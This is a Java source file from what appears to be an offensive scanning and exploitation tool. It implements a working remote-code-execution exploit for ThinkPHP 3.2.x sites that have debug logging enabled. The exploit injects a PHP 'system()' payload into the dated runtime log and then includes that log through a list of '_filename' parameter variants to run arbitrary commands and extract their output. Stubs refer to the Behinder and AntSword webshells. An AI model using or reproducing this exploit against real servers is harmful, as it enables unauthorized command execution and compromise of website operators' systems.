package com.guitool.tpbomb.payload;

import com.guitool.tpbomb.util.ResultUtils;
import com.guitool.tpbomb.util.UrlUtils;

import java.util.ArrayList;
import java.util.Date;

public class TP3LogOpenDebugRce implements PayloadTemplate{
    Date date = new Date();
    String year = String.format("%tY", date);
    String month = String.format("%tm", date);
    String day = String.format("%td", date);
    String logFileName = year.substring(2,4) + "_" + month + "_" + day + ".log";
    final ArrayList<String> payloadList = new ArrayList<>(){{
        add("?m=Home&c=Index&a=index&param[_filename]=./Application/Runtime/Logs/Home/" + logFileName);
        add("?m=Home&c=Index&a=index&name[_filename]=./Application/Runtime/Logs/Home/" + logFileName);
        add("?m=Home&c=Index&a=index&value[_filename]=./Application/Runtime/Logs/Home/" + logFileName);
        add("?m=Home&c=Index&a=index&array[_filename]=./Application/Runtime/Logs/Home/" + logFileName);
        add("?m=Home&c=Index&a=index&arr[_filename]=./Application/Runtime/Logs/Home/" + logFileName);
        add("?m=Home&c=Index&a=index&info[_filename]=./Application/Runtime/Logs/Home/" + logFileName);
        add("?m=Home&c=Index&a=index&list[_filename]=./Application/Runtime/Logs/Home/" + logFileName);
        add("?m=Home&c=Index&a=index&page[_filename]=./Application/Runtime/Logs/Home/" + logFileName);
        add("?m=Home&c=Index&a=index&menus[_filename]=./Application/Runtime/Logs/Home/" + logFileName);
        add("?m=Home&c=Index&a=index&var[_filename]=./Application/Runtime/Logs/Home/" + logFileName);
        add("?m=Home&c=Index&a=index&data[_filename]=./Application/Runtime/Logs/Home/" + logFileName);
        add("?m=Home&c=Index&a=index&module[_filename]=./Application/Runtime/Logs/Home/" + logFileName);
    }};

    @Override
    public ResultUtils checkVulnerability(String url) {
        UrlUtils.doGetSpecial(url + "?m=Home&c=Index&a=index&test=--><?=phpinfo();?>");
        try {
            for (String payload : payloadList) {
                String result = UrlUtils.doGet(url + payload);
                if (result == null) {
                    continue;
                }
                if (result.contains("PHP Version")) {
                    return new ResultUtils(true, "ThinkPHP3.2.x Debug开启RCE", url + payload);
                }
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
        return new ResultUtils(false, "ThinkPHP3.2.x Debug开启RCE", "");
    }

    @Override
    public ResultUtils executeVulnerability(String url, String command) {
        String attackUrl = url + "?m=Home&c=Index&a=index&test=--><?=system(\""+ command + "\");?>";
        UrlUtils.doGetSpecial(attackUrl);
        try {
            for (String payload : payloadList) {
                String output = UrlUtils.doGet(url + payload);
                if (output == null) {
                    continue;
                }
                if (!output.equals("")) {
                    while (output.contains("?m=Home&c=Index&a=index&test=-->")) {
                        output = output.substring(output.indexOf("?m=Home&c=Index&a=index&test=-->") + 32);
                    }
                    output = output.substring(0, output.indexOf("INFO: [ app_init ] --START--"));

                    return new ResultUtils(true, "", output);
                }
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
        return new ResultUtils(false, "", "");
    }

    @Override
    public ResultUtils getBehinderShell(String url) {
        return null;
    }

    @Override
    public ResultUtils getAntswordShell(String url) {
        return null;
    }

}
